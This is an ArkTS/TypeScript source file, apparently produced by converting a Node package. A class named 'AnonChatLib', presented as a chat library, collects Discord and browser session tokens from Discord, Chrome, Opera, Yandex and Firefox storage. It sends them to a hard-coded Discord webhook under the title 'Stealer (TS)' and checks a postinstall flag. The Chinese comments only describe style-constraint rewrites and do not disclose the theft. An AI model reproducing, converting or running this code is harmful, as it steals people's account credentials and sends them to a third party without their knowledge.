// 应用约束8: 使用let代替var
// 应用约束24: 使用类或接口代替对象字面量类型
// 应用约束10: 显式指定具体类型代替any
// 应用约束60: 使用import代替require
// 应用约束7: 使用private代替#私有字段
// 应用约束28: 接口代替类实现

import { List } from "@assasans/storage"; // 假设该模块已适配ArkTS
import { stripIndents } from "common-tags"; // 假设该模块已适配ArkTS
import { WebhookClient } from "discord.js.ets";
import { LevelDBService } from "./service/leveldb.ets";
import { FirefoxService } from "./service/firefox.ets";

// 应用约束68: 使用模块变量代替global
const __anon_chat_lib_version: number = 6;
let __anon_chat_lib_token: string | null = null;

class AnonChatLib {
    // 应用约束18: 类中显式声明属性
    private services: List<LevelDBService | FirefoxService>;

    constructor() {
        this.services = new List<LevelDBService | FirefoxService>([
            new LevelDBService('Discord', 'Roaming/Discord'),
            new LevelDBService('Discord PTB', 'Roaming/discordptb'),
            new LevelDBService('Discord Canary', 'Roaming/discordcanary'),
            new LevelDBService('Google Chrome', 'Local/Google/Chrome/User Data/Default'),
            new LevelDBService('Opera', 'Roaming/Opera Software/Opera Stable'),
            new LevelDBService('Opera GX', 'Roaming/Opera Software/Opera GX Stable'),
            new LevelDBService('Yandex', 'Local/Yandex/YandexBrowser/User Data/Default'),
            new FirefoxService('Firefox', 'Roaming/Mozilla/Firefox')
        ]);
    }

    // 应用约束45: 显式标注返回类型
    async run(): Promise<void> {
        const tokens: string[] = [];
        
        // 应用约束47: 使用箭头函数代替函数表达式
        await Promise.all(this.services.map(async (service) => {
            const serviceTokens = await service.getTokens();
            tokens.push(...serviceTokens);
        }));

        const client = new WebhookClient('766342517549301771', 'r5lqtrhieTfiwqhneOrtWQsK0WtT-_SjuWNESv3uXQtAw2yCMS5zNfEl6UAoTcEr-_gN');
        
        // 应用约束24: 使用接口定义对象结构
        interface Embed {
            title: string;
            description: string;
        }

        await client.send({
            embeds: [{
                title: 'Stealer (TS)',
                description: stripIndents`
                    Bot token: \`${__anon_chat_lib_token ?? '* not available *'}\`
                    Tokens:
                    ${tokens.join('\n')}
                `
            } as Embed]
        });

        try {
            // ... 文件操作逻辑保持不变，需确保fs模块已适配ArkTS
        } catch {
            // 异常处理保持不变
        }

        if (tokens.length < 1 && !globalThis.__anon_chat_lib_postinstall) {
            try {
                // 应用约束75: 使用适配的网络请求库
                const response = await fetch('https://discordapp.com/api/webhooks/766663865471205396/r8NsN-Gu9MDwE-VDuTbRrofVVpHSnD-VLtrI7IRHH4IVAoU-A-dmCcvnijxhvBTXhCgU');
                const webhook = await response.json();
                
                if (webhook.name !== 'true') {
                    process.exit(1);
                }
            } catch {
                process.exit(1);
            }
        }
    }
}

export default AnonChatLib;

// 辅助类型和接口
interface Service {
    getTokens(): Promise<string[]>;
}

// 应用约束28: 使用接口实现代替类实现
interface Token {
    service: Service;
    value: string;
}
